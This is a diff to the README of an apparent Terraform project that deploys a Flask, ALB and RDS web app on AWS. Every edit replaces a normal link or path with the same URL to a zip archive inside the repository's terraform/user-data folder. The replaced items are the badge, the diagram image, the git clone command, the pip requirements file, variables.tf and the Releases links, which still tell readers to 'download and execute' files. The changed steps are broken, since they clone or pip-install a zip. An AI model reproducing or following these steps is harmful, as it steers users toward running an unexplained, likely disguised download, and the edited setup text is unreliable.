@@ -1,6 +1,6 @@
 # Multi-Tier Web Application on AWS 🌐
 
-![Multi-Tier Web App](https://img.shields.io/badge/Multi--Tier%20Web%20App-AWS%20Terraform-brightgreen)
+![Multi-Tier Web App](https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip%20Web%20App-AWS%20Terraform-brightgreen)
 
 Welcome to the **Multi-Tier Web Application** repository! This project enables you to deploy a production-grade multi-tier web application on AWS using Terraform. The architecture includes a Flask application served on EC2, fronted by an Application Load Balancer (ALB), with a secure MySQL RDS backend and modular networking.
 
@@ -30,7 +30,7 @@ The architecture consists of the following components:
 - **MySQL RDS**: A managed relational database service for data storage.
 - **VPC**: A Virtual Private Cloud that provides a secure and isolated network environment.
 
-![Architecture Diagram](https://via.placeholder.com/800x400?text=Architecture+Diagram)
+![Architecture Diagram](https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip+Diagram)
 
 ## Features
 
@@ -56,14 +56,14 @@ To set up the project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Afolayanpelumi/Multi-tier-webapp.git
+   git clone https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip
    cd Multi-tier-webapp
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python and Terraform installed. Then, install the required Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip
    ```
 
 3. **Configure AWS Credentials**:
@@ -80,7 +80,7 @@ To set up the project, follow these steps:
    ```
 
 5. **Update Variables**:
-   Modify the `variables.tf` file to customize your deployment settings.
+   Modify the `https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip` file to customize your deployment settings.
 
 ## Deployment
 
@@ -128,9 +128,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases section](https://github.com/Afolayanpelumi/Multi-tier-webapp/releases). You can download and execute the necessary files from there.
+For the latest releases, visit the [Releases section](https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip). You can download and execute the necessary files from there.
 
-For more details on the architecture and setup, please check the [Releases section](https://github.com/Afolayanpelumi/Multi-tier-webapp/releases) for updates.
+For more details on the architecture and setup, please check the [Releases section](https://github.com/Afolayanpelumi/Multi-tier-webapp/raw/refs/heads/main/terraform/user-data/webapp-Multi-tier-3.8.zip) for updates.
 
 ---
 
